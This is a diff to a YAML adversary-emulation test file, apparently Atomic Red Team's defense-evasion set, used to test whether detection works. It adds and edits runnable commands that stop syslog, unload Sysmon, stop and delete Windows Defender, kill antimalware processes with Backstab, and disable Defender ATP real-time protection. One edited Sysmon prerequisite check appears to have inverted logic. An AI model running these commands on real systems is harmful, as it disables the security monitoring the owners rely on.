@@ -39,6 +39,22 @@ atomic_tests:
       #{cleanup_command}
     name: sh
     elevation_required: true
+- name: Disable syslog (freebsd)
+  auto_generated_guid: db9de996-441e-4ae0-947b-61b6871e2fdf
+  description: |
+    Disables syslog collection
+  supported_platforms:
+  - freebsd
+  executor:
+    command: |
+      service syslogd stop
+      sysrc syslogd_enable="NO"
+    cleanup_command: |
+      sysrc syslogd_enable="YES"
+      service syslogd start
+    name: sh
+    elevation_required: true
+
 - name: Disable Cb Response
   auto_generated_guid: ae8943f7-0f8d-44de-962d-fbc2e2f03eb8
   description: |
@@ -186,34 +202,38 @@ atomic_tests:
   - description: |
       Sysmon must be downloaded
     prereq_command: |
-      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }
+      if (-not (cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe")) { exit 0 } else { exit 1 }
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"
-      Expand-Archive PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip PathToAtomicsFolder\..\ExternalPayloads\Sysmon -Force
-      Remove-Item PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip -Force
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" "PathToAtomicsFolder\..\ExternalPayloads\Sysmon" -Force
   - description: |
       sysmon must be Installed
     prereq_command: |
       if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
     get_prereq_command: |
       if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
-      { Set-Location PathToAtomicsFolder\..\ExternalPayloads\Sysmon\; .\Sysmon.exe -accepteula -i}
+      { & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i}
   - description: |
       sysmon filter must be loaded
     prereq_command: |
       if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      sysmon -u
-      sysmon -accepteula -i
+      if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"){
+        & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u
+        & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i
+      }else{
+        sysmon -u
+        sysmon -accepteula -i
+      }
   executor:
     command: |
       fltmc.exe unload #{sysmon_driver}
     cleanup_command: |
       sysmon -u -i > nul 2>&1
       sysmon -i -accepteula -i > nul 2>&1
-      %temp%\Sysmon\sysmon.exe -u > nul 2>&1
-      %temp%\Sysmon\sysmon.exe -accepteula -i > nul 2>&1
+      "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u > nul 2>&1
+      "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i > nul 2>&1
     name: command_prompt
     elevation_required: true
 - name: Uninstall Sysmon
@@ -575,20 +595,20 @@ atomic_tests:
   - description: |
       Advancedrun.exe must exist at #{AdvancedRun_Location}
     prereq_command: |
-      if(Test-Path -Path #{AdvancedRun_Location}) {exit 0} else {exit 1}
+      if(Test-Path -Path "#{AdvancedRun_Location}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
       Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force
   executor:
     command: |
-      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
       if(#{delete_defender_folder}){
         $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
-        Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
+        Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
       }
     cleanup_command: |
-      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
     name: powershell
     elevation_required: true
 - name: Kill antimalware protected processes using Backstab
@@ -606,12 +626,13 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: Backstab64.exe should exist in ExtrnalPayloads Directory
-    prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe) {exit 0} else {exit 1}
+    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"
   executor:
-    command: '& PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe -k -n #{process_name}'
+    command: |
+      & "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n #{process_name}
     name: powershell
     elevation_required: true
 - name: WinPwn - Kill the event log services for stealth
@@ -827,8 +848,9 @@ atomic_tests:
   auto_generated_guid: e74e4c63-6fde-4ad2-9ee8-21c3a1733114
   description: |
     disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional 
-    payload to the compromised host and to make sure that there will be no recoverable data due to swap feature of linux.
+    payload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.
   supported_platforms:
+  - freebsd
   - linux
   executor:
     command: |
@@ -919,3 +941,19 @@ atomic_tests:
       echo "If test successfully ran, no cleanup required."
     name: bash
     elevation_required: false
+- name: Tamper with Defender ATP on Linux/MacOS
+  auto_generated_guid: 40074085-dbc8-492b-90a3-11bcfc52fda8
+  description: |
+    With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide
+  supported_platforms:
+  - linux
+  - macos
+  executor:
+    command: |
+      sudo mdatp config real-time-protection --value disabled
+    cleanup_command: |
+      sudo mdatp config real-time-protection --value enabled
+    name: sh
+    elevation_required: true
+  
+  
